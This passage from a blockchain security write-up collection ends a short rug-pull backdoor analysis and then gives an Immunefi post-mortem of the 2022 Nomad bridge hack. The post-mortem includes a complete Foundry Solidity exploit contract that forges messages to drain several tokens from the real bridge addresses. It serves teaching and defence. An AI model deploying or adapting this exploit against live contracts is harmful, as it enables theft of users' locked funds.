At this point , the transfer to address was obtained, 0x0000000000000000000000005695ef5f2e997b2e142b38837132a6c3ddc463b7, which was found to be the same as the transfer to address of the call stack.

<div align=center>
<img src="https://miro.medium.com/max/1400/1*v37FEiN6L-0Nwn5OtbDgxQ.png" alt="Cover" width="80%"/>
</div>


When we analyzed the if and else branches of this function carefully, we found that if meet the if condition, then it will do normal redemption . Because through the slot to get stor5 is 0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e, this contract is pancakerouter. backdoor function in the else branch, as long as the parameters passed in and stor7 slot stored value equal to trigger.

<div align=center>
<img src="https://miro.medium.com/max/1400/1*xlYEmp6nsdLA85FUmANxfw.png" alt="Cover" width="80%"/>
</div>


Below function is to modify the value of the slot 7 position, and the call permission only owned by the owner of the contract.

<div align=center>
<img src="https://miro.medium.com/max/1400/1*lHLaCA9HM1HtmL3pXYxltw.png" alt="Cover" width="80%"/>
</div>


All the above analysis is enough to determine that this is a project side run event.

Summary
-------

Numen Cyber Labs remind users that when do investment, it’s necessory to conduct security audits on the project’s contracts. There may be functions in the unverified contract where the project’s authority is too large or directly affects the safety of the user’s assets. The problems with this project are just the tip of the iceberg of the entire blockchain ecosystem. When users invest and project parties develop projects, they must conduct security audits on the code.

Numen Cyber Labs is committed to protecting the ecological security of Web3. Please stay tuned for more latest attack news and analysis.

# OnChain Transaction Debugging: 7. Hack Analysis: Nomad Bridge (2022/08)

Author: [gmhacker.eth](https://twitter.com/realgmhacker)

## Introduction

The Nomad bridge was hacked on August 1st, 2022, and $190m of locked funds were drained. After one attacker first managed to exploit the vulnerability and struck gold, other dark forest travelers jumped to replay the exploit in what eventually became a colossal, “crowdsourced” hack.

A routine upgrade on the implementation of one of Nomad’s proxy contracts marked a zero hash value as a trusted root, which allowed messages to get automatically proved. The hacker leveraged this vulnerability to spoof the bridge contract and trick it to unlock funds.

That first successful transaction alone, which can be seen [here](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), drained 100 WBTC from the bridge–around $2.3m at the time. There was no need for a flashloan or other complex interaction with another DeFi protocol. The attack simply called a function on the contract with the right message input, and the attacker continued throwing blows at the protocol’s liquidity.

Unfortunately, the simple and replayable nature of the transaction led others to collect some of the illicit profit. As [Rekt News](https://rekt.news/nomad-rekt/) put it, “Staying true to DeFi Principles, this hack was permissionless — anyone could join in.”

In this article, we will be analyzing the exploited vulnerability in the Nomad bridge’s Replica contract, and then we’ll create our own version of the attack to drain all the liquidity in one transaction, testing it against a local fork. You can check the full PoC [here](https://github.com/immunefi-team/hack-analysis-pocs/tree/main/src/nomad-august-2022).

This article was written by [gmhacker.eth](https://twitter.com/realgmhacker), an Immunefi Smart Contract Triager.

## Background

Nomad is a cross-chain communication protocol allowing, among other things, bridging of tokens between Ethereum, Moonbeam and other chains. Messages sent to Nomad contracts are verified and transported to other chains through off-chain agents, following an optimistic verification mechanism.

Like most cross-chain bridging protocols, Nomad’s token bridge is able to transfer value through different chains by a process of locking tokens on one side and minting representatives on the other. Because those representative tokens can eventually be burned to unlock the original funds (i.e. bridging back to the token’s native chain), they function as IOUs and have the same economic value as the original ERC-20s. That aspect of bridges in general leads to a big accumulation of funds inside a complex smart contract, rendering it a much-desired target for hackers.

<div align=center>
<img src="https://user-images.githubusercontent.com/107821372/217752487-9580592c-98ed-4690-b330-d211d795d276.png" alt="Cover" width="80%"/>
</div>


Locking & minting process, src: [MakerDAO’s blog](https://blog.makerdao.com/what-are-blockchain-bridges-and-why-are-they-important-for-defi/)

In Nomad’s case, a contract called `Replica`, which is deployed on all supported chains, is responsible for validating messages in a Merkle tree structure. Other contracts in the protocol rely on this for authentication of inbound messages. Once a message is validated, it is stored in the Merkle tree, generating a new committed tree root which gets confirmed to be processed.

## Root Cause

Having a rough understanding of what the Nomad bridge is, we can dive into the actual smart contract code to explore the root cause vulnerability that was leveraged in the various transactions of the August 2022 hack. To do that, we need to go deeper into the `Replica` contract.

```
   function process(bytes memory _message) public returns (bool _success) {
       // ensure message was meant for this domain
       bytes29 _m = _message.ref(0);
       require(_m.destination() == localDomain, "!destination");
       // ensure message has been proven
       bytes32 _messageHash = _m.keccak();
       require(acceptableRoot(messages[_messageHash]), "!proven");
       // check re-entrancy guard
       require(entered == 1, "!reentrant");
       entered = 0;
       // update message status as processed
       messages[_messageHash] = LEGACY_STATUS_PROCESSED;
       // call handle function
       IMessageRecipient(_m.recipientAddress()).handle(
           _m.origin(),
           _m.nonce(),
           _m.sender(),
           _m.body().clone()
       );
       // emit process results
       emit Process(_messageHash, true, "");
       // reset re-entrancy guard
       entered = 1;
       // return true
       return true;
   }
```

<div align=center>


Snippet 1: `process` function on Replica.sol, view [raw](https://gist.github.com/gists-immunefi/f8ef00be9e1c5dd4d879a418966191e0#file-nomad-hack-analysis-1-sol).

</div>

The `process` [function](https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code%23F1%23L179) in the `Replica` contract is responsible for dispatching a message to its final recipient. This will only be successful if the input message has already been proven, which means that the message has already been added to the Merkle tree, leading to an accepted and trustworthy root. That check is done against the message hash, using the `acceptableRoot` view function, which will read from the confirmed roots mapping.

```
   function initialize(
       uint32 _remoteDomain,
       address _updater,
       bytes32 _committedRoot,
       uint256 _optimisticSeconds
   ) public initializer {
       __NomadBase_initialize(_updater);
       // set storage variables
       entered = 1;
       remoteDomain = _remoteDomain;
       committedRoot = _committedRoot;
       // pre-approve the committed root.
       confirmAt[_committedRoot] = 1;
       _setOptimisticTimeout(_optimisticSeconds);
   }
```

<div align=center>


Snippet 2: `initialize` function in Replica.sol, view [raw](https://gist.github.com/gists-immunefi/4792c4bb10d3f73648b4b0f86e564ac9#file-nomad-hack-analysis-2-sol).

</div>

When an upgrade happens on the implementation of a given proxy contract, the upgrading logic may execute a one-time-call initialization function. This function will set some initial state values. In particular, a routine [April 21st upgrade](https://openchain.xyz/trace/ethereum/0x99662dacfb4b963479b159fc43c2b4d048562104fe154a4d0c2519ada72e50bf) was made, and the value 0x00 was passed as the pre-approved committed root, which gets stored into the confirmAt mapping. This is where the vulnerability appeared.

Going back to the `process()` function, we see that we rely on checking for a message hash on the `messages` mapping. That mapping is responsible for marking messages as processed, so that attackers cannot replay the same message.

A particular aspect of an EVM smart contract storage is that all slots are virtually initialized as zero values, which means that if one reads an unused slot in storage, it won’t raise an exception but rather it will return 0x00. A corollary to this is that every unused key on a Solidity mapping will return 0x00. Following that logic, whenever the message hash is not present on the `messages` mapping, 0x00 will be returned, and that will be passed to the `acceptableRoot` function, which in turn will return true given that 0x00 has been set as a trusted root. The message will then be marked as processed, but anybody can simply change the message to create a new unused one and resubmit it.

The input message encodes various different parameters in a given format. Among those, for a message to unlock funds from the bridge, there’s the recipient address. So after the first attacker executed a [successful transaction](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), anyone that knew how to decode the message format could simply change the recipient address and replay the attack transaction, this time with a different message that would give profit to the new address.

## Proof of Concept

Now that we understand the vulnerability that compromised the Nomad protocol, we can formulate our own proof of concept (PoC). We will craft specific messages to call the `process` function in `Replica` function once for each specific token we want to drain, leading to protocol insolvency in just one single transaction.

We’ll start by selecting an RPC provider with archive access. For this demonstration, we will be using [the free public RPC aggregator](https://www.ankr.com/rpc/eth/) provided by Ankr. We select the block number 15259100 as our fork block, 1 block before the first hack transaction.

Our PoC needs to run through a number of steps on a single transaction to be successful. Here is a high-level overview of what we will be implementing in our attack PoC:

1. Select a given ERC-20 token and check the balance of the Nomad ERC-20 bridge contract.
2. Generate a message payload with the right parameters to unlock funds, among which our attacker address as the recipient and the full token balance as the amount of funds to be unlocked.
3. Call the vulnerable process function, which will lead to a transfer of tokens to the recipient address.
4. Loop through various ERC-20 tokens with a relevant presence on the bridge’s balance to drain those funds in the same fashion.

Let’s code one step at a time, and eventually look at how the entire PoC looks. We will be using Foundry.

## The Attack

```
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);
 
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory) {}
}
```

<div align=center>


Snippet 3: The start of our attack contract, view [raw](https://gist.github.com/gists-immunefi/4305df38623ddcaa11812a9c186c73ac#file-nomad-hack-analysis-3-sol).

</div>

Let’s begin by creating our Attacker contract. The entry point to our contract will be the `attack` function, which is as simple as a for loop going through various different token addresses. We check `ERC20_BRIDGE`’s balance of the specific token that we’re dealing with. This is the address of the Nomad ERC-20 bridge contract, which holds the locked funds on Ethereum.

After that, the malicious message payload is generated. The parameters that will change in each loop iteration are the token address and the amount of funds to be transferred. The generated message will be the input to the `IReplica.process` function. As we already established, this function will forward the encoded message to the right end contract on the Nomad protocol to bring the unlock and transferring request to fruition, effectively tricking the bridge logic.

```
contract Attacker {
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

<div align=center>


Snippet 4: Generate the malicious message with the right format and parameters, view [raw](https://gist.github.com/gists-immunefi/2a5fbe2e6034dd30534bdd4433b52a29#file-nomad-hack-analysis-4-sol).

</div>

The generated message needs to be encoded with various different parameters, so that it gets properly unpacked by the protocol. Importantly, we need to specify the forwarding path of the message — the bridge router and the ERC-20 bridge addresses. We must flag the message as a token transfer, hence the `0x3` value as the type.

Finally, we have to specify the parameters that will bring the profit to us–the right token address, the amount to be transferred, and the recipient of that transfer. As we’ve seen already, this will surely create a brand new original message that will never have been processed by the `Replica` contract, which means that it will actually be seen as valid, according to our previous explanation.

Quite impressively, this completes the entire exploit logic. If we had some Foundry logs, our PoC still amounts to only 87 lines of code.

If we run this PoC against the forked block number, we will get the following profits:

* 1,028 WBTC
* 22,876 WETH
* 87,459,362 USDC
* 8,625,217 USDT
* 4,533,633 DAI
* 119,088 FXS
  113,403,733 CQT

## Conclusion

The Nomad Bridge exploit was one of the biggest hacks of 2022. The attack stresses the importance of security throughout the entire protocol. In this particular case, we’ve learned how a single routine upgrade on a proxy implementation can cause a critical vulnerability and compromise all locked funds. Furthermore, during development one needs to be careful regarding the 0x00 default values on storage slots, specially in logic involving mappings. It’s also good to have some unit testing setup for such common values that might lead to vulnerabilities.

It should be noted that some scavenger accounts that drained portions of the funds returned them to the protocol. There are [plans to relaunch the bridge](https://medium.com/nomad-xyz-blog/nomad-bridge-relaunch-guide-3a4ef6624f90), and the returned assets will be distributed to users through pro-rata shares of those recovered funds. Any stolen funds can be returned to Nomad’s [recovery wallet](https://etherscan.io/address/0x94a84433101a10aeda762968f6995c574d1bf154).

As previously pointed out, this PoC actually enhances the hack and drains all TVL in one transaction. It is a simpler attack than what actually took place in reality. This is what our entire PoC looks like, with the addition of some helpful Foundry logs:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/console.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);
 
           console.log(
               "[*] Stealing",
               amount_bridge / 10**ERC20(token).decimals(),
               ERC20(token).symbol()
           );
           console.log(
               "    Attacker balance before:",
               ERC20(token).balanceOf(msg.sender)
           );
 
           // Generate the payload with all of the tokens stored on the bridge
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
 
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
 
           console.log(
               "    Attacker balance after: ",
               IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
           );
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),          // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),      // Recipient of the transfer
           uint256(amount),                  // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

<div align=center>


Snippet 5: all code, view [raw](https://gist.github.com/gists-immunefi/2bdffe6f9683c9b3ab810e1fb7fe4aff#file-nomad-hack-analysis-5-sol).

</div>
